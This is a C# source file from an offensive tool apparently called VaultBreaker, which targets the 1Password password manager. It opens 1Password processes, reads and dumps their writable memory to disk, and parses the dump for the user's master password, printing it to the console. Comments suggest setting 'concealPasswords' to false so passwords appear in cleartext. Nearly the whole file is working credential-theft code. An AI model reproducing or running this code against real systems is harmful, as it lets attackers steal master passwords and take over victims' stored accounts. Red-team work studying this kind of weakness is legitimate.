using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using VaultBreaker.Helpers;
using System.Runtime.Caching;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.IO;
using System.Text.RegularExpressions;

namespace VaultBreaker.Core
{
	class _1Password
	{

		//Enable Cleartext Passwords and then read memory.
		/**
		 *   "security": {
    "concealPasswords": false
  },
	**/

			//Step 1. Add that line to the 1Password
			//Step 2. Dump Memory(?)
			//Step 3. Passwords 


		public static void dumpBitwarden2(string outfile)
		{
			//Process[] procs = Process.GetProcessesByName("Bitwarden.exe");
			Process[] procs = Process.GetProcessesByName("1Password");
			Console.WriteLine("[DEBUG] Number of Processes Found: {0}", procs.Length);
			foreach (var proc in procs)
			{
				//IntPtr hProc = proc.Handle;
				IntPtr hProc = WinAPI.OpenProcess(WinAPI.ProcessAccessFlags.QueryInformation | WinAPI.ProcessAccessFlags.VirtualMemoryRead, false, proc.Id);
				WinAPI.MEMORY_BASIC_INFORMATION64 mbi = new WinAPI.MEMORY_BASIC_INFORMATION64();
				//32 bit
				//WinAPI.MEMORY_BASIC_INFORMATION mbi = new WinAPI.MEMORY_BASIC_INFORMATION()
				WinAPI.SYSTEM_INFO si = new WinAPI.SYSTEM_INFO();
				if (hProc == IntPtr.Zero)
				{
					//Failed.
					Console.WriteLine("Unable to create a connection to the process! Error Code: {0}", WinAPI.GetLastError());
					Environment.Exit(6);
				}

				WinAPI.GetSystemInfo(out si);
				IntPtr hProc_min_addr = si.minimumApplicationAddress;
				IntPtr hProc_max_addr = si.maximumApplicationAddress;
				long hProc_long_min = (long)hProc_min_addr;
				long hProc_long_max = (long)hProc_max_addr;
				string fileName = "dump-" + proc.Id + "-" + proc.ProcessName + "-2.txt";
				StreamWriter sw = new StreamWriter(fileName);

				int bytesRead = 0;

				//Console.WriteLine("[DEBUG] hProc_long_min {0}\r\n[DEBUG] hProc_long_max {1}", hProc_long_min, hProc_long_max);
				while (hProc_long_min < hProc_long_max)
				{
					//Console.WriteLine("[DEBUG] Current Min Addr: {0}", hProc_long_min);\
					//DebugFunctions.writeDebug("Performing VirtualQueryEx()");
					bytesRead = WinAPI.VirtualQueryEx(hProc, hProc_min_addr, out mbi, (uint)Marshal.SizeOf(typeof(WinAPI.MEMORY_BASIC_INFORMATION64)));
					//DebugFunctions.writeDebug("Finished VirtualQueryEx()");
					//if (mbi.Protect == (int)WinAPI.AllocationProtectEnum.PAGE_EXECUTE_READWRITE && mbi.State == WinAPI.StateEnum.MEM_COMMIT)


					//Console.WriteLine("mbi.Protect : {0}\r\nmbi.State {1}", mbi.Protect, mbi.State);
					//if(mbi.Protect == (int)WinAPI.AllocationProtectEnum.PAGE_EXECUTE_READWRITE && mbi.State == (int)WinAPI.StateEnum.MEM_COMMIT)
					if (mbi.Protect == WinAPI.PAGE_READWRITE && mbi.State == WinAPI.MEM_COMMIT)
					{
						byte[] buffer = new byte[mbi.RegionSize];
						//DebugFunctions.writeDebug("Reading Process Memory");
						WinAPI.ReadProcessMemory(hProc, mbi.BaseAddress, buffer, mbi.RegionSize, ref bytesRead);
						//Console.WriteLine("[DEBUG] mbi.RegionSize: {0}", mbi.RegionSize);
						for (long i = 0; i < mbi.RegionSize; i++)
						{
							//sw.WriteLine("0x{0} : {1}", mbi.BaseAddress + i.ToString("X"), (char)buffer[i]);
							sw.Write((char)buffer[i]);
						}
					}
					else
					{
						if (mbi.Protect == WinAPI.PAGE_READWRITE)
						{
							//DebugFunctions.writeDebug("mbi.Protect == PAGE_READWRITE");
						}
						else if (mbi.RegionSize == WinAPI.MEM_COMMIT)
						{
							//Console.WriteLine("mbi.RegionSize == MEM_COMMIT");
						}
						else
						{
							//DebugFunctions.writeDebug("An error occured: " + WinAPI.GetLastError());
							//DebugFunctions.writeDebug("bytesRead: " + bytesRead);
							//DebugFunctions.writeDebug("Exiting, press any key to Continue.");
							//Console.ReadKey();
							//Environment.Exit(24);
						}
					}
					hProc_long_min += mbi.RegionSize;
					hProc_min_addr = new IntPtr(hProc_long_min);
				}
				sw.Close();
				//Slightly Dirty, but keeping the <LF> conversion to help rule out False Positives in output.
				string strResult = File.ReadAllText(fileName).Replace("\n", "<LF>").Replace("\0", String.Empty);

				File.WriteAllText("newline.txt", strResult);
				DebugFunctions.writeDebug("Output to File");
				if (strResult.Contains("{\"name\":\"master-password\",\"value\":\""))
				{
					DebugFunctions.writeDebug("JSON FOUND");
					int start, end;
					string strStartSearch = "{\"name\":\"master-password\",\"value\":\"";
					start = strResult.IndexOf("{\"name\":\"master-password\",\"value\":\"", 0) + 35;
					string strEndSearch = ",\"type\":\"P\",\"designation\":\"password\"},{\"name\":\"account-key\"";
					end = strResult.IndexOf(strEndSearch, 0) - 1;
					DebugFunctions.writeDebug("strEndSearch: " + strResult.IndexOf(strEndSearch) + "\r\n[DEBUG] strStart: " + strResult.IndexOf(strStartSearch));
					//end = start + 100;
					Console.WriteLine("Potential 1Password Password Location found: {0}", strResult.Substring(start, end - start));
				}
				else if (strResult.Contains("on 1password.com.<LF>")) {
					DebugFunctions.writeDebug("Testing Backup");
					int start, end;
					string strStartSearch = "on 1password.com.<LF>";
					start = strResult.IndexOf(strStartSearch, 0) + 20;
					end = strResult.IndexOf("<LF>secret key<LF>");
					Console.WriteLine("Potential 1Password Password Location found: {0}", strResult.Substring(start, end - start));
					Console.ReadKey();
				}
				else
				{
					Console.WriteLine("Not Found");
					Console.ReadKey();
				}
				/**
				else if (false)
				{
					Console.WriteLine("Entering");
					int start, end;
					string strStartSearch = "";
					start = strResult.IndexOf(strStartSearch, 0) + 33;
					//string strEndSearch = "s e c r ";
					//end = strResult.IndexOf(strEndSearch, 0);
					//DebugFunctions.writeDebug("strEndSearch: " + strResult.IndexOf(strEndSearch) + "\r\n[DEBUG] strStart: " + strResult.IndexOf(strStartSearch));
					end = start + 100;
					Console.WriteLine("Potential 1Password Password Location found: {0}", strResult.Substring(start, end - start));
					Console.ReadKey();
				}
				else
				{
					Console.WriteLine("No find");
					Console.ReadKey();
				}
	**/
				Console.WriteLine("Fin. Press any key to exit");
				Console.ReadKey();
			}
		}
	}
}
